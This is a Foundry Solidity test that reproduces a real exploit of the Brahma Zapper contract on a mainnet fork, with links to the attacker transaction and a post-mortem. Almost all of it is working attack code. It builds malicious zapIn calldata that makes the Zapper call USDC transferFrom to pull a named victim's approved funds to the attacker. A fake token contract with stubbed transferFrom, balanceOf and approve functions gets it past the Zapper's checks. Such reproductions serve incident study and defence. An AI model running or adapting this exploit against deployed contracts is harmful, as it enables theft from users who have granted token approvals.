// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// attacker tx: https://etherscan.io/tx/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0
// offcial post-mortem: https://medium.com/neptune-mutual/decoding-brahma-brahtopg-smart-contract-vulnerability-7b7c364b79d8

interface Zapper {
    struct ZapData {
        address requiredToken;
        uint256 amountIn;
        uint256 minAmountOut;
        address allowanceTarget;
        address swapTarget;
        bytes callData;
    }

    function zapIn(ZapData calldata zapCall) external;
}

contract ContractTest is Test {
    Zapper zappper = Zapper(0xD248B30A3207A766d318C7A87F5Cf334A439446D);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address victimAddress = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_933_794);
    }

    function testExploit() public {
        address(WETH).call{value: 1e15}("");
        WETHToFRAX();
        uint256 balance = USDC.balanceOf(victimAddress);
        uint256 allowance = USDC.allowance(victimAddress, address(zappper));
        uint256 amount = balance;
        if (balance > allowance) {
            amount = allowance;
        }
        bytes memory data =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victimAddress, address(this), amount);
        Zapper.ZapData memory zapData = Zapper.ZapData({
            requiredToken: address(this),
            amountIn: 1,
            minAmountOut: 0,
            allowanceTarget: address(this),
            swapTarget: address(USDC),
            callData: data
        });
        zappper.zapIn(zapData);

        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
    }

    function WETHToFRAX() internal {
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FRAX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        return 1;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        FRAX.transfer(address(zappper), 10);
        return true;
    }
}
